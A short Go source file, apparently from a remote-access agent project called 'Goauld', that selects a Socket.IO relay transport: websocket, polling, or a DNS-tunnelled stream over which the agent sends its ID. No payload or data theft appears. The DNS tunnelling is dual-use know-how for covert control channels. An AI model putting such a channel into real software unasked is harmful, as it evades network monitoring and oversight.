//go:build !mini

package control

import (
	"Goauld/agent/config"
	"Goauld/agent/ssh/transport"
	"Goauld/common/log"
	"errors"
	"fmt"
	"strings"

	sio "github.com/hazegard/socket.io-go"
)

func GetRelayEioConfig(mode string, dnsTransport *transport.DNSSH) (*sio.ManagerConfig, error) {
	switch strings.ToLower(mode) {
	case "websocket":
		return getEioConfig([]string{"websocket"}), nil
	case "upgrade":
		return getEioConfig([]string{"polling", "websocket"}), nil
	case "polling":
		return getEioConfig([]string{"polling"}), nil
	case "dns":
		stream, err := dnsTransport.OpenStream()
		if err != nil {
			log.Error().Err(err).Msg("Error opening stream")

			return nil, err
		}

		_, err = stream.Write([]byte(config.Get().ID))
		if err != nil {
			log.Error().Err(err).Msg("Error writing to stream")

			return nil, err
		}
		_, err = stream.Write([]byte{'C'})
		if err != nil {
			return nil, fmt.Errorf("error writing id to DNS tunnelled session: %w", err)
		}

		return getDNSEioConfig(stream), nil
	}

	return nil, errors.New("unable to open Relay Socket.IO config")
}
